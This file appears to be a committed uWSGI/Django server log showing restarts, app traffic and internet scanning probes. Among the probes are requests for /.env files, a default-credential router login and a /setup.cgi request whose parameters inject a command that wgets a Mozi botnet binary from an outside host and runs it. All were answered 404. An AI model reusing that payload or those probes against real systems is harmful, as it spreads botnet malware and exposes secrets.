+[pid: 8|app: 0|req: 18/18] 3.12.36.4 () {36 vars in 507 bytes} [Mon Mar 22 10:01:31 2021] GET /.env => generated 2588 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /
+[pid: 8|app: 0|req: 19/19] 3.12.36.4 () {40 vars in 614 bytes} [Mon Mar 22 10:01:32 2021] POST / => generated 2559 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /boaform/admin/formLogin
+[pid: 8|app: 0|req: 20/20] 115.59.44.233 () {26 vars in 366 bytes} [Mon Mar 22 10:28:10 2021] GET /boaform/admin/formLogin?username=admin&psd=admin => generated 2672 bytes in 4 msecs (HTTP/1.0 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /
+[pid: 8|app: 0|req: 21/21] 223.38.75.216 () {44 vars in 935 bytes} [Mon Mar 22 10:30:55 2021] GET / => generated 2564 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 8|app: 0|req: 22/22] 223.38.75.216 () {44 vars in 892 bytes} [Mon Mar 22 10:30:55 2021] GET /favicon.ico => generated 2615 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /
+[pid: 8|app: 0|req: 23/23] 162.142.125.37 () {28 vars in 299 bytes} [Mon Mar 22 11:26:38 2021] GET / => generated 2561 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 8|app: 0|req: 24/24] 162.142.125.37 () {34 vars in 431 bytes} [Mon Mar 22 11:26:38 2021] GET / => generated 2558 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /setup.cgi
+[pid: 8|app: 0|req: 25/25] 42.224.54.250 () {26 vars in 586 bytes} [Mon Mar 22 11:56:24 2021] GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://42.224.54.250:45541/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 => generated 2766 bytes in 4 msecs (HTTP/1.0 404) 6 headers in 173 bytes (1 switches on core 0)
+...brutally killing workers...
+worker 1 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /srv/docker-server
+closing all non-uwsgi socket fds > 2 (max_fd = 1048576)...
+found fd 3 mapped to socket 0 (/srv/docker-server/django.sock)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.19.1 (64bit) on [Mon Mar 22 12:54:22 2021] ***
+compiled with version: 8.3.0 on 22 March 2021 05:35:39
+os: Linux-5.4.0-1018-aws #18-Ubuntu SMP Wed Jun 24 01:15:00 UTC 2020
+nodename: b39e63c71bbf
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 4
+current working directory: /srv/docker-server
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /srv/docker-server
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited UNIX address /srv/docker-server/django.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.8.5 (default, Sep 10 2020, 16:47:10)  [GCC 8.3.0]
+Python main interpreter initialized at 0x55fa4f1901d0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 166752 bytes (162 KB) for 2 cores
+*** Operational MODE: threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55fa4f1901d0 pid: 1 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 1)
+spawned uWSGI worker 1 (pid: 11, cores: 2)
+*** Starting uWSGI 2.0.19.1 (64bit) on [Mon Mar 22 12:54:41 2021] ***
+compiled with version: 8.3.0 on 22 March 2021 05:35:39
+os: Linux-5.4.0-1018-aws #18-Ubuntu SMP Wed Jun 24 01:15:00 UTC 2020
+nodename: a00f574c881b
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 4
+current working directory: /srv/docker-server
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /srv/docker-server
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /srv/docker-server/django.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.8.5 (default, Sep 10 2020, 16:47:10)  [GCC 8.3.0]
+Python main interpreter initialized at 0x561c66455200
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 166752 bytes (162 KB) for 2 cores
+*** Operational MODE: threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x561c66455200 pid: 1 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 1)
+spawned uWSGI worker 1 (pid: 8, cores: 2)
+Method Not Allowed: /accounts/login/
+[pid: 8|app: 0|req: 1/1] 175.203.81.8 () {44 vars in 893 bytes} [Mon Mar 22 12:54:57 2021] GET /accounts/login/ => generated 7703 bytes in 383 msecs (HTTP/1.1 405) 8 headers in 403 bytes (1 switches on core 0)
+Method Not Allowed: /accounts/login/
+[pid: 8|app: 0|req: 2/2] 175.203.81.8 () {44 vars in 893 bytes} [Mon Mar 22 12:54:58 2021] GET /accounts/login/ => generated 7703 bytes in 20 msecs (HTTP/1.1 405) 8 headers in 403 bytes (1 switches on core 1)
+Method Not Allowed: /accounts/login/
+[pid: 8|app: 0|req: 3/3] 175.203.81.8 () {44 vars in 893 bytes} [Mon Mar 22 12:54:58 2021] GET /accounts/login/ => generated 7703 bytes in 20 msecs (HTTP/1.1 405) 8 headers in 403 bytes (1 switches on core 0)
+Method Not Allowed: /accounts/login/
+[pid: 8|app: 0|req: 4/4] 175.203.81.8 () {44 vars in 893 bytes} [Mon Mar 22 12:54:59 2021] GET /accounts/login/ => generated 7703 bytes in 19 msecs (HTTP/1.1 405) 8 headers in 403 bytes (1 switches on core 1)
+...brutally killing workers...
+worker 1 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /srv/docker-server
+closing all non-uwsgi socket fds > 2 (max_fd = 1048576)...
+found fd 3 mapped to socket 0 (/srv/docker-server/django.sock)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.19.1 (64bit) on [Mon Mar 22 13:09:05 2021] ***
+compiled with version: 8.3.0 on 22 March 2021 05:35:39
+os: Linux-5.4.0-1018-aws #18-Ubuntu SMP Wed Jun 24 01:15:00 UTC 2020
+nodename: a00f574c881b
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 4
+current working directory: /srv/docker-server
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /srv/docker-server
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited UNIX address /srv/docker-server/django.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.8.5 (default, Sep 10 2020, 16:47:10)  [GCC 8.3.0]
+Python main interpreter initialized at 0x55ab2399c1d0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 166752 bytes (162 KB) for 2 cores
+*** Operational MODE: threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55ab2399c1d0 pid: 1 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 1)
+spawned uWSGI worker 1 (pid: 11, cores: 2)
+*** Starting uWSGI 2.0.19.1 (64bit) on [Mon Mar 22 13:10:37 2021] ***
+compiled with version: 8.3.0 on 22 March 2021 13:09:59
+os: Linux-5.4.0-1018-aws #18-Ubuntu SMP Wed Jun 24 01:15:00 UTC 2020
+nodename: b63654a43c5b
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 4
+current working directory: /srv/docker-server
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /srv/docker-server
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /srv/docker-server/django.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.8.5 (default, Sep 10 2020, 16:47:10)  [GCC 8.3.0]
+Python main interpreter initialized at 0x556173547200
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 166752 bytes (162 KB) for 2 cores
+*** Operational MODE: threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x556173547200 pid: 1 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 1)
+spawned uWSGI worker 1 (pid: 9, cores: 2)
+Method Not Allowed: /accounts/login/
+[pid: 9|app: 0|req: 1/1] 175.203.81.8 () {44 vars in 893 bytes} [Mon Mar 22 13:10:50 2021] GET /accounts/login/ => generated 7703 bytes in 370 msecs (HTTP/1.1 405) 8 headers in 403 bytes (1 switches on core 0)
+Not Found: /
+[pid: 9|app: 0|req: 2/2] 175.203.81.8 () {42 vars in 832 bytes} [Mon Mar 22 13:10:55 2021] GET / => generated 2691 bytes in 6 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+[pid: 9|app: 0|req: 3/3] 175.203.81.8 () {44 vars in 868 bytes} [Mon Mar 22 13:10:59 2021] GET /admin/ => generated 0 bytes in 5 msecs (HTTP/1.1 302) 9 headers in 339 bytes (1 switches on core 0)
+[pid: 9|app: 0|req: 4/4] 175.203.81.8 () {44 vars in 905 bytes} [Mon Mar 22 13:10:59 2021] GET /admin/login/?next=/admin/ => generated 2194 bytes in 17 msecs (HTTP/1.1 200) 9 headers in 469 bytes (1 switches on core 1)
+[pid: 9|app: 0|req: 5/5] 175.203.81.8 () {42 vars in 844 bytes} [Mon Mar 22 13:11:01 2021] GET /admin/ => generated 0 bytes in 1 msecs (HTTP/1.1 302) 9 headers in 339 bytes (1 switches on core 0)
+[pid: 9|app: 0|req: 6/6] 175.203.81.8 () {42 vars in 881 bytes} [Mon Mar 22 13:11:01 2021] GET /admin/login/?next=/admin/ => generated 2194 bytes in 13 msecs (HTTP/1.1 200) 9 headers in 469 bytes (1 switches on core 1)
+...brutally killing workers...
+worker 1 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /srv/docker-server
+closing all non-uwsgi socket fds > 2 (max_fd = 1048576)...
+found fd 3 mapped to socket 0 (/srv/docker-server/django.sock)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.19.1 (64bit) on [Mon Mar 22 13:11:53 2021] ***
+compiled with version: 8.3.0 on 22 March 2021 13:09:59
+os: Linux-5.4.0-1018-aws #18-Ubuntu SMP Wed Jun 24 01:15:00 UTC 2020
+nodename: b63654a43c5b
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 4
+current working directory: /srv/docker-server
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /srv/docker-server
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited UNIX address /srv/docker-server/django.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.8.5 (default, Sep 10 2020, 16:47:10)  [GCC 8.3.0]
+Python main interpreter initialized at 0x56240cf251d0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 166752 bytes (162 KB) for 2 cores
+*** Operational MODE: threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x56240cf251d0 pid: 1 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 1)
+spawned uWSGI worker 1 (pid: 12, cores: 2)
+*** Starting uWSGI 2.0.19.1 (64bit) on [Mon Mar 22 13:13:49 2021] ***
+compiled with version: 8.3.0 on 22 March 2021 13:13:09
+os: Linux-5.4.0-1018-aws #18-Ubuntu SMP Wed Jun 24 01:15:00 UTC 2020
+nodename: 3d9407d59472
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 4
+current working directory: /srv/docker-server
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /srv/docker-server
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /srv/docker-server/django.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.8.5 (default, Sep 10 2020, 16:47:10)  [GCC 8.3.0]
+Python main interpreter initialized at 0x55cc6d9ce200
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 166752 bytes (162 KB) for 2 cores
+*** Operational MODE: threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55cc6d9ce200 pid: 1 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 1)
+spawned uWSGI worker 1 (pid: 10, cores: 2)
+[pid: 10|app: 0|req: 1/1] 175.203.81.8 () {44 vars in 912 bytes} [Mon Mar 22 13:15:03 2021] GET /admin/login/?next=/admin/ => generated 2194 bytes in 389 msecs (HTTP/1.1 200) 9 headers in 469 bytes (1 switches on core 0)
+[pid: 10|app: 0|req: 2/2] 175.203.81.8 () {44 vars in 872 bytes} [Mon Mar 22 13:16:04 2021] GET /swagger/ => generated 2232 bytes in 6 msecs (HTTP/1.1 200) 8 headers in 392 bytes (1 switches on core 1)
+[pid: 10|app: 0|req: 3/3] 175.203.81.8 () {44 vars in 860 bytes} [Mon Mar 22 13:16:05 2021] GET /swagger/?format=openapi => generated 3759 bytes in 10 msecs (HTTP/1.1 200) 7 headers in 239 bytes (1 switches on core 0)
+[pid: 10|app: 0|req: 4/4] 23.22.16.221 () {36 vars in 482 bytes} [Mon Mar 22 13:16:06 2021] GET /swagger/?format=openapi => generated 3759 bytes in 8 msecs (HTTP/1.1 200) 7 headers in 239 bytes (1 switches on core 1)
+[pid: 10|app: 0|req: 5/5] 175.203.81.8 () {44 vars in 868 bytes} [Mon Mar 22 13:17:02 2021] GET /redoc/ => generated 1002 bytes in 5 msecs (HTTP/1.1 200) 7 headers in 224 bytes (1 switches on core 0)
+[pid: 10|app: 0|req: 6/6] 175.203.81.8 () {42 vars in 753 bytes} [Mon Mar 22 13:17:03 2021] GET /redoc/?format=openapi => generated 3759 bytes in 8 msecs (HTTP/1.1 200) 7 headers in 239 bytes (1 switches on core 1)
+Not Found: /.env
+[pid: 10|app: 0|req: 7/7] 193.56.29.152 () {36 vars in 511 bytes} [Mon Mar 22 13:44:31 2021] GET /.env => generated 2715 bytes in 6 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 10|app: 0|req: 8/8] 193.56.29.152 () {40 vars in 618 bytes} [Mon Mar 22 13:44:32 2021] POST / => generated 2686 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /core/.env
+[pid: 10|app: 0|req: 9/9] 193.56.29.152 () {36 vars in 521 bytes} [Mon Mar 22 13:44:33 2021] GET /core/.env => generated 2730 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 10|app: 0|req: 10/10] 193.56.29.152 () {40 vars in 618 bytes} [Mon Mar 22 13:44:34 2021] POST / => generated 2686 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /app/.env
+[pid: 10|app: 0|req: 11/11] 193.56.29.152 () {36 vars in 519 bytes} [Mon Mar 22 13:44:35 2021] GET /app/.env => generated 2727 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 10|app: 0|req: 12/12] 193.56.29.152 () {40 vars in 618 bytes} [Mon Mar 22 13:44:36 2021] POST / => generated 2686 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /public/.env
+[pid: 10|app: 0|req: 13/13] 193.56.29.152 () {36 vars in 525 bytes} [Mon Mar 22 13:44:37 2021] GET /public/.env => generated 2736 bytes in 5 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 10|app: 0|req: 14/14] 193.56.29.152 () {40 vars in 618 bytes} [Mon Mar 22 13:44:38 2021] POST / => generated 2686 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /.env
+[pid: 10|app: 0|req: 15/15] 129.146.252.126 () {36 vars in 513 bytes} [Mon Mar 22 13:50:58 2021] GET /.env => generated 2715 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 10|app: 0|req: 16/16] 129.146.252.126 () {40 vars in 620 bytes} [Mon Mar 22 13:50:59 2021] POST / => generated 2686 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+[pid: 10|app: 0|req: 17/17] 175.203.81.8 () {42 vars in 848 bytes} [Mon Mar 22 13:51:11 2021] GET /swagger/ => generated 2232 bytes in 5 msecs (HTTP/1.1 200) 8 headers in 392 bytes (1 switches on core 0)
+[pid: 10|app: 0|req: 18/18] 175.203.81.8 () {44 vars in 860 bytes} [Mon Mar 22 13:51:12 2021] GET /swagger/?format=openapi => generated 3759 bytes in 8 msecs (HTTP/1.1 200) 7 headers in 239 bytes (1 switches on core 1)
+[pid: 10|app: 0|req: 19/19] 23.22.16.221 () {36 vars in 482 bytes} [Mon Mar 22 13:51:14 2021] GET /swagger/?format=openapi => generated 3759 bytes in 9 msecs (HTTP/1.1 200) 7 headers in 239 bytes (1 switches on core 0)
+[pid: 10|app: 0|req: 20/20] 175.203.81.8 () {42 vars in 848 bytes} [Mon Mar 22 13:51:18 2021] GET /swagger/ => generated 2232 bytes in 5 msecs (HTTP/1.1 200) 8 headers in 392 bytes (1 switches on core 1)
+[pid: 10|app: 0|req: 21/21] 175.203.81.8 () {44 vars in 860 bytes} [Mon Mar 22 13:51:18 2021] GET /swagger/?format=openapi => generated 3759 bytes in 9 msecs (HTTP/1.1 200) 7 headers in 239 bytes (1 switches on core 0)
+[pid: 10|app: 0|req: 22/22] 23.22.16.221 () {36 vars in 482 bytes} [Mon Mar 22 13:51:18 2021] GET /swagger/?format=openapi => generated 3759 bytes in 9 msecs (HTTP/1.1 200) 7 headers in 239 bytes (1 switches on core 1)
+[pid: 10|app: 0|req: 23/23] 211.52.210.47 () {40 vars in 770 bytes} [Mon Mar 22 13:51:20 2021] GET /swagger/ => generated 2232 bytes in 5 msecs (HTTP/1.1 200) 8 headers in 392 bytes (1 switches on core 0)
+[pid: 10|app: 0|req: 24/24] 211.52.210.47 () {44 vars in 871 bytes} [Mon Mar 22 13:51:20 2021] GET /swagger/?format=openapi => generated 3759 bytes in 8 msecs (HTTP/1.1 200) 7 headers in 239 bytes (1 switches on core 1)
+[pid: 10|app: 0|req: 25/25] 23.22.16.221 () {36 vars in 482 bytes} [Mon Mar 22 13:51:21 2021] GET /swagger/?format=openapi => generated 3759 bytes in 9 msecs (HTTP/1.1 200) 7 headers in 239 bytes (1 switches on core 0)
+[pid: 10|app: 0|req: 26/26] 221.145.194.16 () {42 vars in 850 bytes} [Mon Mar 22 13:51:29 2021] GET /swagger/ => generated 2232 bytes in 5 msecs (HTTP/1.1 200) 8 headers in 392 bytes (1 switches on core 1)
+[pid: 10|app: 0|req: 27/27] 221.145.194.16 () {44 vars in 862 bytes} [Mon Mar 22 13:51:30 2021] GET /swagger/?format=openapi => generated 3759 bytes in 8 msecs (HTTP/1.1 200) 7 headers in 239 bytes (1 switches on core 0)
+[pid: 10|app: 0|req: 28/28] 23.22.16.221 () {36 vars in 482 bytes} [Mon Mar 22 13:51:31 2021] GET /swagger/?format=openapi => generated 3759 bytes in 8 msecs (HTTP/1.1 200) 7 headers in 239 bytes (1 switches on core 1)
+[pid: 10|app: 0|req: 29/29] 1.245.233.122 () {40 vars in 760 bytes} [Mon Mar 22 13:51:35 2021] GET /swagger/ => generated 2232 bytes in 5 msecs (HTTP/1.1 200) 8 headers in 392 bytes (1 switches on core 0)
+[pid: 10|app: 0|req: 30/30] 1.245.233.122 () {44 vars in 861 bytes} [Mon Mar 22 13:51:36 2021] GET /swagger/?format=openapi => generated 3759 bytes in 8 msecs (HTTP/1.1 200) 7 headers in 239 bytes (1 switches on core 1)
+[pid: 10|app: 0|req: 31/31] 23.22.16.221 () {36 vars in 482 bytes} [Mon Mar 22 13:51:36 2021] GET /swagger/?format=openapi => generated 3759 bytes in 9 msecs (HTTP/1.1 200) 7 headers in 239 bytes (1 switches on core 0)
+[pid: 10|app: 0|req: 32/32] 175.203.106.211 () {40 vars in 762 bytes} [Mon Mar 22 13:52:00 2021] GET /swagger/ => generated 2232 bytes in 5 msecs (HTTP/1.1 200) 8 headers in 392 bytes (1 switches on core 1)
+[pid: 10|app: 0|req: 33/33] 175.203.106.211 () {44 vars in 863 bytes} [Mon Mar 22 13:52:00 2021] GET /swagger/?format=openapi => generated 3759 bytes in 9 msecs (HTTP/1.1 200) 7 headers in 239 bytes (1 switches on core 0)
+[pid: 10|app: 0|req: 34/34] 23.22.16.221 () {36 vars in 482 bytes} [Mon Mar 22 13:52:01 2021] GET /swagger/?format=openapi => generated 3759 bytes in 9 msecs (HTTP/1.1 200) 7 headers in 239 bytes (1 switches on core 1)
+Not Found: /
+[pid: 10|app: 0|req: 35/35] 221.145.194.16 () {42 vars in 834 bytes} [Mon Mar 22 13:52:53 2021] GET / => generated 2691 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 10|app: 0|req: 36/36] 221.145.194.16 () {42 vars in 791 bytes} [Mon Mar 22 13:52:53 2021] GET /favicon.ico => generated 2742 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Unauthorized: /accounts/child/
+[pid: 10|app: 0|req: 37/37] 221.145.194.16 () {48 vars in 908 bytes} [Mon Mar 22 13:53:36 2021] POST /accounts/child/ => generated 58 bytes in 2 msecs (HTTP/1.1 401) 8 headers in 251 bytes (1 switches on core 0)
+[pid: 10|app: 0|req: 38/38] 221.145.194.16 () {48 vars in 920 bytes} [Mon Mar 22 13:53:46 2021] POST /accounts/check/email/ => generated 25 bytes in 1 msecs (HTTP/1.1 201) 7 headers in 214 bytes (1 switches on core 1)
+[pid: 10|app: 0|req: 39/39] 221.145.194.16 () {48 vars in 918 bytes} [Mon Mar 22 13:53:54 2021] POST /accounts/check/user/ => generated 49 bytes in 52 msecs (HTTP/1.1 200) 7 headers in 209 bytes (1 switches on core 0)
+[pid: 10|app: 0|req: 40/40] 175.203.81.8 () {48 vars in 918 bytes} [Mon Mar 22 13:54:35 2021] POST /accounts/check/email/ => generated 25 bytes in 1 msecs (HTTP/1.1 201) 7 headers in 214 bytes (1 switches on core 1)
+[pid: 10|app: 0|req: 41/41] 221.145.194.16 () {48 vars in 918 bytes} [Mon Mar 22 13:54:39 2021] POST /accounts/check/user/ => generated 49 bytes in 8 msecs (HTTP/1.1 200) 7 headers in 209 bytes (1 switches on core 0)
+[pid: 10|app: 0|req: 42/42] 221.145.194.16 () {48 vars in 918 bytes} [Mon Mar 22 13:54:39 2021] POST /accounts/check/user/ => generated 49 bytes in 8 msecs (HTTP/1.1 200) 7 headers in 209 bytes (1 switches on core 1)
+[pid: 10|app: 0|req: 43/43] 221.145.194.16 () {48 vars in 918 bytes} [Mon Mar 22 13:54:41 2021] POST /accounts/check/user/ => generated 49 bytes in 7 msecs (HTTP/1.1 200) 7 headers in 209 bytes (1 switches on core 0)
+Unauthorized: /accounts/child/setting/1/
+[pid: 10|app: 0|req: 44/44] 221.145.194.16 () {46 vars in 905 bytes} [Mon Mar 22 13:55:09 2021] DELETE /accounts/child/setting/1/ => generated 58 bytes in 1 msecs (HTTP/1.1 401) 8 headers in 253 bytes (1 switches on core 1)
+Unauthorized: /accounts/child/
+[pid: 10|app: 0|req: 45/45] 221.145.194.16 () {48 vars in 908 bytes} [Mon Mar 22 13:56:13 2021] POST /accounts/child/ => generated 58 bytes in 1 msecs (HTTP/1.1 401) 8 headers in 251 bytes (1 switches on core 0)
+[pid: 10|app: 0|req: 46/46] 221.145.194.16 () {42 vars in 850 bytes} [Mon Mar 22 13:56:53 2021] GET /swagger/ => generated 2232 bytes in 5 msecs (HTTP/1.1 200) 8 headers in 392 bytes (1 switches on core 1)
+[pid: 10|app: 0|req: 47/47] 221.145.194.16 () {44 vars in 862 bytes} [Mon Mar 22 13:56:53 2021] GET /swagger/?format=openapi => generated 3759 bytes in 9 msecs (HTTP/1.1 200) 7 headers in 239 bytes (1 switches on core 0)
+[pid: 10|app: 0|req: 48/48] 23.22.16.221 () {36 vars in 482 bytes} [Mon Mar 22 13:56:54 2021] GET /swagger/?format=openapi => generated 3759 bytes in 10 msecs (HTTP/1.1 200) 7 headers in 239 bytes (1 switches on core 1)
+Not Found: /.env
+[pid: 10|app: 0|req: 49/49] 172.81.129.86 () {36 vars in 488 bytes} [Mon Mar 22 13:58:47 2021] GET /.env => generated 2715 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /wp-content/
+[pid: 10|app: 0|req: 50/50] 172.81.129.86 () {36 vars in 502 bytes} [Mon Mar 22 13:58:48 2021] GET /wp-content/ => generated 2736 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /
+[pid: 10|app: 0|req: 51/51] 103.145.13.24 () {28 vars in 295 bytes} [Mon Mar 22 14:05:15 2021] GET / => generated 2685 bytes in 4 msecs (HTTP/1.0 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 10|app: 0|req: 52/52] 172.105.161.142 () {34 vars in 477 bytes} [Mon Mar 22 14:41:00 2021] GET / => generated 2685 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /
+[pid: 10|app: 0|req: 53/53] 45.144.225.171 () {26 vars in 273 bytes} [Mon Mar 22 14:48:37 2021] HEAD / => generated 2684 bytes in 4 msecs (HTTP/1.0 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /.env
